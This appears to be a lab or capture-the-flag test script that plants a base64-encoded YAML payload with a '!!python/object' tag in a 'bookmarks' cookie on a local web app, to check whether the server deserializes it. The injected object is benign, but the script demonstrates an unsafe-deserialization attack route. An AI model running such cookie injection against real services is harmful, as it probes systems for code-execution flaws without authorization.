import requests
import base64

target = "http://127.0.0.1:32979"

# Test with a session using cookies.set instead of cookies parameter in get
session = requests.Session()

yaml_payload = """- !!python/object:app.models.UrlObj
  name: MyTest123
  url: https://testurl.example.com
"""

encoded = base64.b64encode(yaml_payload.encode()).decode()
print(f"Setting bookmark cookie: {encoded}")

# Set cookie on session
session.cookies.set("bookmarks", encoded, domain="127.0.0.1", path="/")

# Also try the user cookie from context
user_cookie = "f99d00962aa7465fa151128d2318d75d"
session.cookies.set("user", user_cookie, domain="127.0.0.1", path="/")

print(f"Session cookies: {dict(session.cookies)}")

# Now make request
resp = session.get(target, timeout=10)

print("\n=== Response ===")
print(resp.text)

if "MyTest123" in resp.text:
    print("\n>>> SUCCESS - BOOKMARK FOUND <<<")
else:
    print("\n>>> BOOKMARK NOT FOUND <<<")
    print("Response code:", resp.status_code)
    print("Cookies sent:", resp.request.headers.get('Cookie', 'None'))

